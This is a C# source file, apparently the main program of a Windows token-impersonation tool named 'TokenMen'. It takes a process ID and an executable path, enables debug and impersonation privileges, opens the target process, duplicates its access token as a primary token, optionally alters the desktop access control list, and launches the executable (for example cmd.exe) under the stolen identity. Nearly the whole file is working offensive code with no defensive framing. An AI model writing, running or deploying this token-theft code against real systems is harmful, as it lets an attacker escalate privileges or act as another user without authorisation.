namespace TokenMen;

public class Program
{
    public static void Main(string[] args)
    {

        string AppName = AppDomain.CurrentDomain.FriendlyName;
        if (args.Length < 2)
        {
            Console.WriteLine($"Usage: {AppName} <PID> <Program To Launch> [ChangeACL]");
            Console.WriteLine($"Example: {AppName} 3060 cmd.exe");
            return;
        }

        // Get PID of a user's process to grab the token from, and command to launch with that token
        if (!uint.TryParse(args[0], out uint targetPID)) 
        {
            Console.WriteLine("[-] Invalid PID");
            return;
        };

        string executableToLaunch = args[1];
        bool changeAcl = args.Length == 3 && args[2].ToLower() == "changeacl";

        Console.WriteLine($"[!] Using token from PID: {targetPID} to launch: {executableToLaunch}");

        
        Console.WriteLine("[!] Adjusting Privileges");
        string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
        
        if (!Utils.PrivilegeEnabler(privileges))
            return;
        
        
        // Get Handle to the Process chosen by the user
        IntPtr hProc = OpenProcess(PROCESS_ACCESS.PROCESS_QUERY_LIMITED_INFORMATION, false, targetPID);
        if (hProc == IntPtr.Zero)
        {
            Console.WriteLine($"[-] OpenProcess Failed. (Error: {GetLastErrorString()})");
            return;
        }
        Console.WriteLine($"[+] Got handle to process");

        // Get Handle to the Process's Token
        bool res = OpenProcessToken(hProc, TokenAccessRights.TOKEN_DUPLICATE, out IntPtr hToken);
        if (!res)
        {
            Console.WriteLine($"[-] Failed to get token handle. (Error: {GetLastErrorString()})");
            return;
        }
        Console.WriteLine("[+] Got handle to token");

        // Duplicate
        bool dup = DuplicateTokenEx(hToken, TokenAccessRights.TOKEN_ALL_ACCESS, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, out IntPtr hDupToken);
        if (!dup)
        {
            Console.WriteLine($"[-] Failed to duplicate token. (Error: {GetLastErrorString()})");
            return;
        }
        Console.WriteLine("[+] Token duplicated Successfully");


        if (changeAcl)
        {
            bool OK = Acl.ChangeDesktopACL();
            if (!OK)
            {
                Console.WriteLine("[-] Failed to change DACL");
                return;
            }
            Console.WriteLine("[+] ACLs changed");
        }

        // Create a new Process with the duplicated Primary Token
        var pi = new PROCESS_INFORMATION();
        var si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);

        bool CreateProcessW = CreateProcessWithTokenW(hDupToken, 0, null, executableToLaunch, 0, IntPtr.Zero, null, ref si, out pi);
        if (!CreateProcessW)
        {
            Console.WriteLine($"[-] CreateProcessWithTokenW Failed. (Error: {GetLastErrorString()})");
            return;
        }
        Console.WriteLine("[+] CreateProcessWithTokenW Success");
    }


}